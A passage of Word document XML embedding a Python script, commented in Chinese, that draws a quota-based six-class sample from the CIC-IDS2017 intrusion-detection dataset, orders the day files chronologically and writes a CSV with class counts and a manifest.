          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        "Friday-WorkingHours-Morning",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="58A6C811">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        "Friday-WorkingHours-Afternoon-DDos",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7AD5348A">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        "Friday-WorkingHours-Afternoon-PortScan",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="302E1892">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    ]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="46157483">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="67660067">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3AF4FC2B">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>def parse_quota(text):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C01B9D7">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    if not text:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="44D8878A">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        return dict(DEFAULT_QUOTA)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="16A934E1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    quota = dict(DEFAULT_QUOTA)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="453C4003">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    for item in text.split(","):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="79761F4C">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        name, _, val = item.partition("=")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0DDCD00D">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        quota[name.strip()] = int(val)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="641E16EB">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    return quota</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="558F112E">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6A190F0B">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="61F7EE94">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>def main(argv=None):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0A7BE14B">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    ap = argparse.ArgumentParser(description="抽取 CIC-IDS2017 六类小样本")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B57762F">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    ap.add_argument("--raw-dir", default="data/raw/cicids2017")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1C763C54">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    ap.add_argument("--out", default="data/cicids2017_sample.csv")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="55CCAAC7">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    ap.add_argument("--quota", default=None, help='形如 "BENIGN=80000,DoS Hulk=30000"')</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A584C0E">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    ap.add_argument("--seed", type=int, default=42)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="79BF0E59">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    args = ap.parse_args(argv)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1B010FE4">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="74D7F282">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    raw_dir = Path(args.raw_dir)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="13A32407">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    day_order = chronological_order()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7FA0835A">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    # 按时间顺序排列，而不是文件名字母序：字母序 Friday 会排在 Monday 前面</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0BFACB50">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    files = sorted(</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1C06D93F">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        raw_dir.glob("*.csv"),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="28F22FCD">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        key=lambda p: next(</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="30C5731C">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            (i for i, k in enumerate(day_order) if p.stem.startswith(k)), len(day_order)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="50D13B9A">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        ),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="02B35B7B">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    )</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7E1D6187">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    if len(files) != 8:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4D918E44">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        raise SystemExit(f"{raw_dir} 下应有 8 个 CSV（官方 MachineLearningCVE），实际 {len(files)} 个")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="43BF33AE">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    names = [p.stem for p in files]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="65803717">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    if len(set(names)) != 8:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0270BD2D">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        raise SystemExit(f"文件与时间顺序表未一一对应：{names}")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0EB4A232">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5FA1FBA1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    quota = parse_quota(args.quota)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="15D873D2">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    classes = list(CLASSES)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="39104AB6">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4F03DEB0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    counts = count_by_file(files)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0A372730">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    alloc, totals = allocate(counts, quota, classes)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A559CEA">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="02FE93C5">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    out = build(files, alloc, args.seed)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4CB02A27">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    out_path = Path(args.out)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="169B2E73">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    out_path.parent.mkdir(parents=True, exist_ok=True)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="436AD19E">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    out.to_csv(out_path, index=False)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3F3E98E1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="272BEABC">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    label_col = label_column(out)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="38241AC6">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    final = out[label_col].value_counts().to_dict()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6CAF2CD3">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    print(f"\n[写出] {out_path}  {len(out):,} 行 × {out.shape[1]} 列 "</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="728ADF32">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">          f"({out_path.stat().st_size / 1e6:.0f} MB)", flush=True)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2EF6D05B">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    for cls in classes:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="58F8B246">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        n = final.get(cls, 0)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="770F0326">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        print(f"    {cls:&lt;12} {n:&gt;7,}  (全量 {totals[cls]:&gt;9,})", flush=True)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E8CA2C2">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7D386B26">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    manifest = {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="71D73C83">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        "created_at": datetime.now(timezone.utc).isoformat(timespec="seconds"),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C1E6F24">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
